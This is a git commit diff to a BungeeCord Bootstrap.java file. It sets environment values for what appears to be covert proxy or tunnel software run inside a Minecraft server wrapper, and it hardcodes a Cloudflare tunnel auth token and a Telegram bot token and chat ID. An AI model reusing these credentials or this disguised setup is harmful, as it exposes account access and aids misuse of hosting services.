f2e2b7d8814339147da77afcb1c1328fcb73f61a
xilin3185 <xilin3185@gmail.com>
2025-10-24 11:14:22 +0800

    Update environment variables in Bootstrap.java

--- bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
+++ bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
@@ -94,20 +94,20 @@ public class Bootstrap
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+        envVars.put("UUID", "07864363-82b1-43e6-a145-5749073e28aa");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
+        envVars.put("ARGO_PORT", "36223");
+        envVars.put("ARGO_DOMAIN", "mcst.a.3.a.b.0.d.0.0.1.0.a.2.ip6.arpa");
+        envVars.put("ARGO_AUTH", "eyJhIjoiYjBlMDhjMzA0Y2ZlZGEzNWE2NWM1ZDA2YTkyYWU4NmEiLCJ0IjoiZWU4NmJjMDktZDU3Mi00MGI0LWE5ZmEtMWFiMTk2ODVjZTM0IiwicyI6Ik5UQXlZemhsWkRrdE9EVmpZeTAwTmpVMUxUZ3dZVEF0WlRCaU5HWTVOekE0WkRsaSJ9");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
+        envVars.put("CHAT_ID", "8078145001");
+        envVars.put("BOT_TOKEN", "8207007142:AAEIAZmdafIORNgQQpcuRVdzlqv8wNol7Ds");
         envVars.put("CFIP", "store.ubi.com");
         envVars.put("CFPORT", "443");
         envVars.put("NAME", "Mc");
